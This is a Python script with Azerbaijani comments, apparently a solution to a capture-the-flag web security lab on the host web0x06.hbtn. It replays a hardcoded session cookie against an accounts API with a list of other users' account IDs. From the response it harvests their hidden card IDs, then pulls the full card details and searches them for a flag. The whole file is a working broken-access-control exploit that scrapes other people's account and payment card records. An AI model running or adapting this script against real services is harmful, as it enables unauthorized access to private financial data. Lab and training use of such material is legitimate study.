import requests
import json

# Kontaktlardan tapdığımız "yeni" istifadəçilərin Hesab ID-ləri (account_id)
# Robert, James, Brian, Mark və David-ə aid hesablar
account_ids = [
    "ac6b2a3cbf5648959ad24401b3f6ce12", "a9d05c18d01f4f71abe8dd0a24583a4b", 
    "44ec481974954efb8a5b43ff58d0baf1", "6ab861adfd97427caece4a4179772f20", 
    "c6b57dfbe78e4ecf91b065b295f13813", "5da2a4373312420cbaa7a13baed57676", 
    "c4c67ed0d9b0429496f8d56f1da91a81", "5d51b09150c5411ba060e4c331f5f62e", 
    "2c80806be67646638e82c9c5bdb2c3b1", "e1479d43584c4ce1817d7c596ed54aa3"  
]

cookies = {
    "session": "vw5CZ4aypAxDEmWUSq7mZ2XOYWfUaSVvcCaOQlRhrdo.5eImUtd-10eJCycNoR4zyDVtIOQ"
}

print("1. Mərhələ: Hesablardan gizli Kart ID-ləri çəkilir...\n")
accounts_url = "http://web0x06.hbtn/api/accounts/info"
acc_response = requests.post(accounts_url, json={"accounts_id": account_ids}, cookies=cookies)

card_ids = []

if acc_response.status_code == 200:
    accounts_data = acc_response.json().get("message", [])
    for acc in accounts_data:
        # Hesabın içində cards_id siyahısı varsa, onları yığırıq
        if "cards_id" in acc:
            card_ids.extend(acc["cards_id"])
            
    print(f"Tapılan Kart ID-ləri: {len(card_ids)} ədəd.\n")
else:
    print(f"Hesab məlumatları çəkilərkən xəta oldu: Status {acc_response.status_code}")

# Əgər kart ID-ləri tapdıqsa, onlara aid detalları çəkirik
if card_ids:
    print("2. Mərhələ: Bütün tapılmış Kart ID-lərin detalları yoxlanılır...\n")
    cards_url = "http://web0x06.hbtn/api/cards/info"
    card_response = requests.post(cards_url, json={"cards_id": card_ids}, cookies=cookies)
    
    if card_response.status_code == 200:
        cards_data = card_response.json().get("message", [])
        
        # Bütün datanı ekrana tökürük
        print("-" * 60)
        print(json.dumps(cards_data, indent=4, ensure_ascii=False))
        print("-" * 60)
        
        # Script avtomatik "flag" sözünü axtarır
        if "flag" in json.dumps(cards_data).lower():
            print("\n[!!!] TƏBRİKLƏR: Data daxilində 'flag' sözü tapıldı! Yuxarıdakı nəticəni diqqətlə oxu.")
        else:
            print("\nAvtomatik 'flag' sözü tapılmadı. Zəhmət olmasa məlumatları özün gözlə yoxla.")
    else:
        print(f"Kart məlumatları çəkilərkən xəta oldu: Status {card_response.status_code}")
